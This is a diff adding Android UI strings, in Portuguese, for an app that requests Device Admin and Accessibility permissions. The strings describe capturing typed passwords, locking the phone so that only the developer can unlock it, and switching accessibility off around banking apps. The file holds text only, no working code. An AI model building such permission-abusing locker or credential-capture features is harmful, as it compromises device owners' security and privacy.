@@ -1,0 +1,12 @@
+<resources>
+
+    <string name="app_name">GuilhermeApp</string>
+    <string name="ativar_permissao">Ativar Permissão</string>
+    <string name="sample_device_admin_title">Device Admin</string>
+    <string name="sample_device_admin_description">Ative a permissão de Device Admin para que possamos fazer o nosso trabalho para você! Utilizamos essa permissão para recuperar a senha que está sendo digitada, caso digite errada, bloqueamos o celular. Somente o desenvolvedor desse app consegue devolver ele desativado. Caso não conheça o desenvolvedor, por favor não utilize o app e desinstale-o agora.</string>
+    <string name="device_admin_ativado_com_sucesso">Device Admin ativado com sucesso!</string>
+    <string name="accessibility_service_title">Serviço de Acessibilidade</string>
+    <string name="enable_service_dialog_desc">Você precisa ativar esse serviço de acessibildiade para nos fazermos nosso trabalho corretamente!</string>
+    <string name="notification_description_acessibility">Parece que você entrou em um app de banco, para não bloquear seu acesso, desativamos o serviço de acessibilidade para você! Click para ativar a acessibilidade de novo!</string>
+
+</resources>
